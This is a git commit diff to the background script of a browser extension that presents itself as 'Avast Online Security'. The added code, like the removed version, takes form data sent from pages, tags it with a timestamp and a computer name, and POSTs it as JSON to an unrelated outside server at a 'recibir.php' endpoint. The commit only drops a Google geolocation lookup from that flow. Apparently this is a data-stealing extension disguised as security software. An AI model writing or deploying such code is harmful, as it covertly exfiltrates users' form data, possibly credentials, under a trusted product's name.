4988be71f376e1f79f4525ae2e43e1ed09d21d63
larry852 <larryportocarrero@gmail.com>
2017-09-21 19:21:53 -0500

    Eliminacion de api google

--- Extension/Avast Online Security/js/background.js
+++ Extension/Avast Online Security/js/background.js
@@ -1,22 +1,13 @@
 chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
   var d = new Date();
   request.data.timeStamp = d.toString();
-  request.data.computer = localStorage.getItem('computer').toString();
-  var ip = new XMLHttpRequest();
-  ip.onreadystatechange = function() {
-    if (ip.readyState == 4 && ip.status == 200) {
-          //Info (datos del formulario + datos de ip)
-          var data = new Array(request.data, JSON.parse(ip.responseText));
-          // Definimos la URL que vamos a solicitar via Ajax
-          var ajax_url = "http://multirecargasysuministros.com/iluminati/recibir.php";
-          var ajax_request = new XMLHttpRequest();
-          ajax_request.open("POST", ajax_url, true );
-          // Establecer la cabecera Content-Type apropiada
-          ajax_request.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
-          // Enviar la informacion
-          ajax_request.send(JSON.stringify(data));
-        }
-      };
-  ip.open("GET", "https://maps.googleapis.com/maps/api/browserlocation/json?browser=chrome&sensor=true", true);
-  ip.send();
+  computer = localStorage.getItem('computer');
+  if (computer == null) computer = 'Larry';
+  request.data.computer = computer.toString();
+  var data = new Array(request.data);
+  var ajax_url = "http://multirecargasysuministros.com/iluminati/recibir.php";
+  var ajax_request = new XMLHttpRequest();
+  ajax_request.open("POST", ajax_url, true );
+  ajax_request.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
+  ajax_request.send(JSON.stringify(data));
 });
